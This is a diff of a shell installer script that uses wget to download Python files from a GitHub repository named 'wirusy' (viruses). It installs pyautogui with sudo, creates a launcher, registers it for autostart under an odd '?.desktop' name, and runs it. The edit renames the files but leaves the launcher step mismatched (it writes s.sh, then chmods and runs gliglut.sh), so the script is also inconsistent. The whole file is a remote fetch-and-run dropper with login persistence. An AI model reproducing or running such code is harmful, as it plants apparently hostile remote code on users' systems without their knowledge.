@@ -1,13 +1,13 @@
-rm s.py
+rm gliglut.py
 rm addautostart.py
-wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/s.py'
+wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/gliglut.py'
 wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
 user=$(whoami)
 sudo pip3 install pyautogui
-rm s.sh
-echo "python3 /home/$user/s.py" > s.sh
-chmod +x s.sh
+rm gliglut.sh
+echo "python3 /home/$user/gliglut.py" > s.sh
+chmod +x gliglut.sh
 eval $"rm '/home/$user/.config/autostart/?.desktop'"
-python3 /home/$user/addautostart.py '?' './home/$user/s.sh'
+python3 /home/$user/addautostart.py '?' './home/$user/gliglut.sh'
 eval $"chmod +x '/home/$user/.config/autostart/?.desktop'"
-./s.sh
+bash gliglut.sh
